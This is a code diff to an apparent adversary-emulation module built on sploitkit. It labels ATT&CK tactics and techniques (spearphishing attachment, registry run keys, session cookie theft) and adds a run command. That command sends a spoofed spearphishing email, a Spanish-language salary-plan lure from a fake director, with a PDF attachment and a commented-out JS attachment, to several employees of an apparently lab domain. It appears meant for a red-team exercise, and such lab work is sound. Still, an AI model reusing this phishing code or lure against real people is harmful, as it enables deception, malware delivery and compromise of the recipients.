@@ -1,10 +1,22 @@
 from sploitkit import *
+import smtplib
 
+# For guessing MIME type
+import mimetypes
 
-class initacc(Command):
+# Import the email modules we'll need
+import email
+import email.mime
+import email.mime.application
+from email.mime import multipart
+from email.mime import text
+from email.mime.multipart import MIMEMultipart
+
+class IA(Command):
     """ Initial access """
     level = "module"
     single_arg = True
+    #keys = ["Initial Access","Persistence","Credential Access","Command and Control"]
 
     def complete_values(self):
         #TODO: compute the list of possible values
@@ -24,14 +36,16 @@ class Show(Command):
     """ Show options, projects, modules or issues (if any) """
     level = "module"
     single_arg = True
-    keys = ["TacticalObjectives","Initial Access", "Execution", "Persistence","Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement","Collection","Command and Control","Exfiltration","Impact"]
-    
+    keys = ["Initial Access","Persistence","Credential Access","Command and Control"]
     def complete_values(self, key):
-        obj = ["Initial Access", "Execution", "Persistence","Privilege Escalation","Defense Evasion","Credential Access","Discovery","Lateral Movement","Collection","Command and Control","Exfiltration","Impact"]
+        obj = ["Initial Access","Persistence","Credential Access","Command and Control"]
+        IA = ["Spearphishing Attachment"]
+        P = ['Registry Run Keys']
+        CA = ['Steal Web Session Cookie']
+        C2 = ['Multi-Stage Channels']
         
-        if key == "TacticalObjectives":
-            for i in range(len(obj)):
-                print(obj[i])
+        if key == "Initial Access":
+            print(IA)
         elif key == "options":
             return list(self.config.keys())
         elif key == "projects":
@@ -78,9 +92,58 @@ class Show(Command):
 
 class run(Command):
     level="module"
-
+    
     def run(self):
         print("running...")
+        # Import smtplib for the actual sending function
+
+        # Create a text/plain message
+        msg = email.mime.multipart.MIMEMultipart()
+        msg['Subject'] = 'Nuevo programa de sueldos 2021.'
+        msg['From'] = 'wwhite@ecorp.local'
+        msg['To'] = 'Administrator@ecorp.local'
+
+        # The main body is just another attachment
+        body = email.mime.text.MIMEText("""Estimados empleados de ecorp, les hago saber en el siguiente documento sobre los cambios que tendremos en las nómina​s y los sueldos para el año entrante.
+        Saludos, y excelente fin de año!
+        Walter White
+        Director General
+        """)
+        msg.attach(body)
+
+        # Attach PDF 
+        filename='plan2021.pdf'
+        fp=open(filename,'rb')
+        att = email.mime.application.MIMEApplication(fp.read(),_subtype="pdf")
+        fp.close()
+        att.add_header('Content-Disposition','attachment',filename=filename)
+        msg.attach(att)
+
+
+        #Attach JS
+
+        #filename='attachments/test.js'
+        #fp=open(filename,'rb')
+        #att = email.mime.application.MIMEApplication(fp.read(),_subtype="js")
+        #fp.close()
+        #att.add_header('Content-Disposition','attachment',filename=filename)
+        #msg.attach(att)
+
+        # send via Gmail server
+        # NOTE: my ISP, Centurylink, seems to be automatically rewriting
+        # port 25 packets to be port 587 and it is trashing port 587 packets.
+        # So, I use the default port 25, but I authenticate. 
+        s = smtplib.SMTP(host='ecorp.local')
+        #s.starttls()
+        #s.login('xyz@gmail.com','xyzpassword')
+        s.sendmail('wwhite@ecorp.local',['Administrator@ecorp.local'], msg.as_string())
+        msg['To'] = 'sjohnson@ecorp.local'
+        s.sendmail('wwhite@ecorp.local',['sjhonson@ecorp.local'], msg.as_string())
+        msg['To'] = 'ajepsen@ecorp.local'        
+        s.sendmail('wwhite@ecorp.local',['ajepsen@ecorp.local'], msg.as_string())
+        msg['To'] = 'wanderson@ecorp.local'
+        s.sendmail('wwhite@ecorp.local',['wanderson@ecorp.local'], msg.as_string())
+        s.quit()
 
 
 class CommandWithTwoArgs(Command):
